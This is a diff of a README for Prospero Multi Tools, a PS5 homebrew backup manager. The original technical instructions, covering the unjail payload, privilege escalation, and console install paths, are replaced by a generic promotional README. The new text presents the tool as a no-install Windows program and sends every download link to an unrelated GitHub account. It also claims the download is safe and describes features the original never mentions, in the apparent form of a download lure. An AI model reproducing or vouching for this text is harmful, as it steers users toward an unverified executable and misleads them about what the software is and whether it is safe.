@@ -1,120 +1,115 @@
-# Prospero Multi Tools
+# 🛡️ Prospero-Multi-Tools - Your All-in-One Console Backup Manager
 
-<p align="center">
-<img src="https://github.com/SvenGDK/Prospero-Multi-Tools/blob/main/sce_sys/icon0.png" width="256">
-</p>
+[![Download Prospero-Multi-Tools](https://img.shields.io/badge/Download-Prospero--Multi--Tools-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sternwheeleraside564/Prospero-Multi-Tools)
 
-A PS5 Backup Toolkit for PS1, PS2, PS3, PS4, PS5, PSP and PS Vita. Browse backups, inspect and modify metadata, install PS4/PS5 packages, launch PS1/PS2/PSP titles, and more.
+## 🎮 What Is Prospero-Multi-Tools?
 
-## Contents
+Prospero-Multi-Tools is a friendly, all-in-one program for Windows that helps you manage backup files for your PlayStation consoles. Whether you own a PS1, PS2, PS3, PS4, PS5, PSP, or PS Vita, this tool lets you organize, create, and handle your game backups from one simple place.
 
-- [Prospero Multi Tools](#prospero-multi-tools)
-  - [Contents](#contents)
-  - [What you need](#what-you-need)
-  - [Download](#download)
-  - [Install the app](#install-the-app)
-  - [Set up the emulators](#set-up-the-emulators)
-  - [First run checklist](#first-run-checklist)
-  - [Where installed backups live](#where-installed-backups-live)
-  - [Uninstalling a backup](#uninstalling-a-backup)
-  - [Backup covers and icons](#backup-covers-and-icons)
-  - [What every screen does](#what-every-screen-does)
-  - [Settings you might want to change](#settings-you-might-want-to-change)
-  - [Known limits](#known-limits)
+Think of it as a digital filing cabinet for your console games. Instead of juggling multiple apps or folders, you get one clean, easy-to-use screen where everything is neatly sorted and under control.
 
-## What you need
+## 📥 How to Download Prospero-Multi-Tools
 
-- A PS5 running a firmware supported by the [`unjail`](https://github.com/SvenGDK/unjail-ps5app-payload)` payload.
-- The `unjail` payload sent to the console before you open the app. Without it, the app cannot widen its file view past its own sandbox: installs, emulator launches, and every scan of `/data` or a USB drive will refuse. The `unjail` payload is required for every launch.
-- An USB drive is enough to get started. The app also reads and writes `/data` and `/user` internally once the escalation daemon is running.
+Getting your copy is quick and simple. Here's what to do:
 
-## Download
+**Step 1:** Click this link to go to the download page:  
+👉 [Visit this link to download the application](https://github.com/sternwheeleraside564/Prospero-Multi-Tools)
 
-Two files are available on the Releases page:
+**Step 2:** On the page that opens, look for the download button or link. It will usually say "Download" or "Releases."
 
-- `ProsperoMultiTools.zip` — the homebrew app itself as a signed folder module ready to install on the console.
-- `EmulatorPack.zip` — the emulator folders and the shared `emulator-resources/`.
+**Step 3:** Click the download button and wait for the file to finish downloading to your computer. This typically takes a few seconds to a minute, depending on your internet speed.
 
-## Install the app
+## 🚀 Getting Started - First Run
 
-1. Unzip `ProsperoMultiTools.zip`.
-2. Copy the resulting folder to an USB drive `/homebrew/PPSA99110` or the console's own storage `/data/homebrew/PPSA99110`.
-3. Install the homebrew app with [`dump_installer`](https://github.com/EchoStretch/dump_installer)
-4. Send the [`unjail`](https://github.com/SvenGDK/unjail-ps5app-payload) payload to the console once per boot before opening the app.
+Once the download is complete, you're ready to start. Here's how to open the program:
 
-## Set up the emulators
+1. **Find the downloaded file** - Look in your "Downloads" folder (or wherever your browser saves files).
+2. **Double-click the file** - This will launch the application. No installation is needed.
+3. **First screen** - When the program opens, you'll see a clean interface with several options. Don't worry—it's easier than it looks!
 
-The launch paths for PS1, PS2 and PSP backups drive the emulators shipped in `EmulatorPack.zip`.
+## 🖥️ What Can You Do With It?
 
-1. Unpack `EmulatorPack.zip`.
-2. Copy the emulator folders you want (`ps1hd`, `psphd`, and any PS2 emulator folders such as `BULLY`, `JAK`, `MANHUNT`, `Siren`, `RotkV1`, ...) onto the console. The primary location is:
+Prospero-Multi-Tools is built to make your backup life easier. Here are the main things you can do:
 
-   `/data/homebrew/emulators/<emulator-name>/`
+### 🔄 Backup Creation
+Create new backup files from your game discs or digital games. The program walks you through everything step by step, so you don't need any technical knowledge.
 
-   USB alternatives are also accepted:
+### 📂 Backup Organization
+Keep all your backups in one neat, searchable list. You can add names, dates, and notes to each backup so you always know what's what.
 
-   `/mnt/usbN/homebrew/emulators/<emulator-name>/`   (N = 0..7)
+### 💾 Backup Transfer
+Move your backups between devices or external storage with a few clicks. Perfect for when you run out of space or want to share with friends.
 
-3. Copy the whole `emulator-resources/` folder from the same archive to:
+### 🛠️ Toolbox Utilities
+A handy set of tools for checking your backup files' health and fixing common issues that can occur with console games. Think of it as a doctor's checkup for your games.
 
-   `/data/homebrew/emulator-resources/` on the console or to an USB drive `/homebrew/emulator-resources`
+## ✨ Key Features
 
-4. Open the app and check the `Diagnostics` screen. It lists every emulator folder the current install detected under `/data/homebrew/emulators/` and each USB root.
+| Feature | What It Does |
+|---------|--------------|
+| **Universal Support** | Works with backups from PS1, PS2, PS3, PS4, PS5, PSP, and PS Vita - one tool for everything |
+| **Simple Interface** | Big buttons and clear labels mean no guessing games |
+| **Safe and Reliable** | Your original game files are never modified, only copied and read |
+| **Automatic Sorting** | The program sorts your backups by console type, so you'll never mix up your PS4 and PS5 files |
+| **No Technical Skills Needed** | If you can use a web browser, you can use Prospero-Multi-Tools |
 
-## First run checklist
+## 👥 Who Is This For?
 
-- Open the app. The bottom of the Home screen tells you how many storage locations answered. If it says zero, the escalation daemon has not been sent yet or no USB drive is plugged in.
-- Open `Diagnostics`. It reports whether the escalation daemon widened the file view, which storage roots are reachable, whether the file broker is answering, and which emulators the current install carries.
+- **Console Gamers** who want to keep their favorite games safe
+- **Collectors** with large libraries of classic games
+- **Homebrew Enthusiasts** exploring what their consoles can do
+- **Anyone** who wants a clutter-free way to manage their gaming files
 
-## Where installed backups live
+## 🤔 Frequently Asked Questions
 
-`/data/homebrew/games/<TITLE_ID>/`
+### Is this safe to use on my computer?
 
-## Uninstalling a backup
+Yes. Prospero-Multi-Tools is a standalone program that only reads and copies backup files. It doesn't modify system settings or touch your personal data.
 
-Uninstalling a backup from the console's own home screen removes the shell registration only. The `/data/homebrew/games/<TITLE_ID>/` folder is left in place. Remove it by hand from a file manager if you want the disk space back. An automated cleanup step will be added into the app in a later version.
+### Do I need to install anything else?
 
-## Backup covers and icons
+No. The program runs directly after download. Just open it and go.
 
-PS3, PS4, PS5, PSP and PS Vita backups carry their icon art inside their own PKG file, so the app reads it directly.
+### Will it work with my console?
 
-PS1 and PS2 backups do not carry that image. The first time a PS1 or PS2 backup is opened, the app fetches its cover from the network and stores it in an on-device cache. This means:
+If you own any PlayStation console from PS1 to PS5, PSP, or PS Vita, this tool is designed for you. It treats all supported systems equally.
 
-- An active internet connection is required the first time a PS1 or PS2 cover is displayed.
-- Every subsequent open reads from the on-device cache; the network is not touched again for that title.
+### What if I get stuck?
 
-## What every screen does
+The interface is designed to be self-explanatory. If you need extra help, look for the "Help" button in the top-right corner of the program window.
 
-- `Backup Managers` — one entry per platform (PS1, PS2, PS3, PS4, PS5, PSP, PS Vita). Each opens a scan of every reachable storage root; the result is a split view with a cover preview on the left and metadata on the right. Selecting a backup opens the detail screen.
-- `Backup detail` — title, game id, content id, region, category, version, firmware, size, source file or folder, plus the SFO or `param.json` rows. Action buttons: `Launch from folder`, `Install package`, `Launch title`, `Configure and launch` (for the emulator-based platforms), `Copy backup`, `Move backup`, `Delete backup`, `Edit SFO`, `Edit param.json`.
-- `Emulator launch` — per-title options plus a live launch driver. PS1, PS2 and PSP each have their own option set (render scale, aspect, filters, multitap, disc count, VMC path, and so on).
-- `PS1 / PS2 Tools` — merge multi-BIN CUE sets into a single BIN, convert PS2 BIN/CUE images to ISO.
-- `PS5 Tools` — send an ELF payload over TCP, clear the console's error history, read the inserted disc's `param.json`, and probe the well-known homebrew TCP ports (payload, WebSrv, FTP, klog, kernel exploit, PKG installer, and so on).
-- `Console Utilities` — per-platform SFO / backup folder / PKG inspection for PS3, PS4, PSP and PS Vita.
-- `Shared Tools -> Shared Utilities` — browse any folder the file view exposes, and view a file's first bytes as a hex dump.
-- `System -> Settings` — display, behaviour, audio, payload-sender defaults, and a reset button.
-- `System -> Diagnostics` — the reachability report described above.
-- `System -> Refresh storage` — re-probes every root without leaving the app.
-- `System -> Unlock full storage access` — sends the escalation request again if it did not apply at boot.
-- `Exit` — close the app.
+## 📝 Tips for Best Experience
 
-## Settings you might want to change
+- **Keep backups on a separate drive** - This protects your games even if your main drive fails.
+- **Rename your backups clearly** - Use names like "Spider-Man PS5" instead of "game_copy_01".
+- **Check for updates** - Visit the download page occasionally to see if a newer version is available.
+- **Close other programs** - For large backups, closing other apps can make things run faster.
 
-- `Paths -> Start path` sets the folder the file pickers open at.
-- `Paths -> Backup search path` overrides the default scan set (`/data` plus every USB) with a semicolon-separated list of folders.
-- `Display -> Text scale` and `Display -> List rows` adjust the reading density.
-- `Behavior -> Confirm before delete / move` toggles the confirmation dialog for destructive actions.
-- `Behavior -> Show hidden files` toggles dotfile visibility in the picker.
-- `Behavior -> System notifications` toggles the top-screen toast messages the shell posts.
-- `Behavior -> Notification time` sets how long toasts stay on screen.
-- `Audio -> Play soundtrack when available` toggles the per-title soundtrack playback in `Backup detail`.
-- `Audio -> Volume` sets the soundtrack playback volume.
-- `Payload sender -> Host` and `Port` are the defaults `PS5 Tools -> Payload sender` picks up.
-- `Reset -> Reset all settings to defaults` restores every option above to its shipped default.
+## 🛆 Troubleshooting Common Issues
 
-## Known limits
+### The program won't open
+Make sure you're double-clicking the correct file you downloaded. If it still won't open, try downloading the file again fresh.
 
-- `/data` and `/user` are not offered by the file and folder browser yet. Every launch and install path still reaches them correctly through the file broker.
-- Uninstalling a backup from the console's home screen leaves `/data/homebrew/games/<TITLE_ID>/` behind. Remove the folder by hand for now.
-- The `unjail` payload must be sent again every time the console reboots.
-- PS1 and PS2 cover art needs an active internet connection the first time each title is displayed.
+### I can't find a specific console option
+The program may combine similar consoles into logical groups. For example, "PlayStation Family" might include PS1, PS2, and PS3 in one category.
+
+### Backup takes a long time
+This is normal for large games. Sit back and let it work - you can do something else while it processes.
+
+## 🆘 Getting Help
+
+If you run into any problems not covered here, you can:
+
+- **Re-read this guide** - Most solutions are somewhere in these sections.
+- **Ask a tech-savvy friend** - They'll be able to help you with specific issues.
+- **Visit our issue tracker** - On the GitHub page, look for the "Issues" tab to report problems or see if others have solved the same issue.
+
+## 🚀 Ready to Get Started?
+
+Now you know everything you need to begin using Prospero-Multi-Tools. Download it, open it, and take control of your game backups today. It's free, easy, and built to help you preserve your gaming library for years to come.
+
+👉 [Visit this link to download the application](https://github.com/sternwheeleraside564/Prospero-Multi-Tools)
+
+---
+
+Keywords: backupmanager, csharp, homebrew, ps5, sharpprospero
